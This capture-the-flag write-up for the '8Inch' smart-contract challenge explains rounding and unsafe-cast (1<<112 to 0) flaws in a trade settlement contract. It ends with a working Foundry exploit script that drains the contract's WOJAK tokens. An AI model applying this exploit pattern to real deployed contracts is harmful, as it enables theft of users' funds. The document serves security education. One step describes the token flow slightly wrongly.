# 8Inch

Author: cbd1913 ([X/Twitter](https://x.com/cbd1913))

In this challenge, we are presented with a trade settlement contract where a trade has been created with the sell token `WOJAK` and the buy token `WETH`. The objective is to drain all `WOJAK` tokens and transfer them to the `0xc0ffee` address.

Within the `createTrade` function, the contract subtracts a `fee` from `_amountToSell` and records it in `trades[tradeId].amountToSell`. The entire amount of `WOJAK` tokens is transferred to the contract. In the `settleTrade` function, only the subtracted amount of `WOJAK` tokens can be transferred to the buyer, meaning we cannot directly drain all `WOJAK` tokens.

There is an issue in the `settleTrade` function where the buy amount to be transferred is rounded down:

```solidity
uint256 tradeAmount = _amountToSettle * trade.amountToBuy;
require(
    IERC20(trade.tokenToBuy).transferFrom(
        msg.sender,
        trade.maker,
        tradeAmount / trade.amountToSell
    ),
    "Buy transfer failed"
);
```

This means we can obtain 9 wei of `WOJAK` tokens by calling `settleTrade` with `_amountToSettle = 9`, without needing to provide any `WETH` tokens.

Additionally, there is an issue in the `SafeUint112` library that allows the value `1<<112` to be converted into `0`:

```solidity
/// @dev safeCast is a function that converts a uint256 to a uint112 and reverts on overflow
function safeCast(uint256 value) internal pure returns (uint112) {
    require(value <= (1 << 112), "SafeUint112: value exceeds uint112 max");
    return uint112(value);
}
```

We can exploit this vulnerability by setting a value to exactly `1<<112`, causing it to be converted to `0`.

Another suspicious function in the contract is `scaleTrade`. This function scales `amountToSell` and `amountToBuy` by multiplying them by a `scale` value, likely to trigger the overflow issue in `SafeUint112`. The critical part we need to bypass is the `originalAmountToSell < newAmountNeededWithFee` condition, as we do not possess any `WOJAK` tokens for the contract to transfer from us. Therefore, we need to make `newAmountNeededWithFee = 0` to bypass this condition. This can be achieved by setting `scale` such that `scale * originalAmountToSell + fee = 1<<112`.

```solidity
trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale));
trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale));
uint256 newAmountNeededWithFee = safeCast(
    safeMul(originalAmountToSell, scale) + fee
);
if (originalAmountToSell < newAmountNeededWithFee) {
    require(
        IERC20(trade.tokenToSell).transferFrom(
            msg.sender,
            address(this),
            newAmountNeededWithFee - originalAmountToSell
        ),
        "Transfer failed"
    );
}
```

However, we cannot directly manipulate the existing `trade` because our address is not the maker:

```solidity
require(msg.sender == trades[_tradeId].maker, "Only maker can scale");
```

Thus, we must create a new trade and attempt to drain all `WOJAK` tokens. The new trade must use `WOJAK` as the sell token because we want it to transfer `WOJAK` tokens out when calling `settleTrade`. Combined with the first issue, we can first obtain a small amount of `WOJAK` tokens from the contract, then create a new trade with `WOJAK` as the sell token.

The complete exploit strategy is as follows:

1. Drain 32 wei of `WOJAK` tokens from the contract with 4 calls to `settleTrade`.
2. Create a new trade with 32 wei of `WOJAK` as the sell token and any token as the buy token. The contract will record `amountToSell` as `32 - fee`, which is `2`.
3. Scale the trade with `scale = ((1 << 112) - 30) / 2` to make `tokenToSell` a large value, thereby bypassing the `originalAmountToSell < newAmountNeededWithFee` condition.
4. Settle the trade with `_amountToSettle = 10 ether`, which will transfer `10 ether` of `WOJAK` tokens to the contract.

Script:

```solidity
function run() public {
    vm.startBroadcast();

    t.settleTrade(0, 9);
    t.settleTrade(0, 9);
    t.settleTrade(0, 9);
    t.settleTrade(0, 5);
    SimpleERC20 weth2 = new SimpleERC20(
        "Wrapped Ether 2",
        "WETH2",
        18,
        10 ether
    );
    wojak.approve(address(t), 100);
    t.createTrade(address(wojak), address(weth2), 32, 0);
    t.scaleTrade(1, ((1 << 112) - 30) / 2);
    t.settleTrade(1, 10 ether);
    console.log("balance of wojak", wojak.balanceOf(user));
    wojak.transfer(address(0xc0ffee), 10 ether);
    vm.stopBroadcast();
}
```
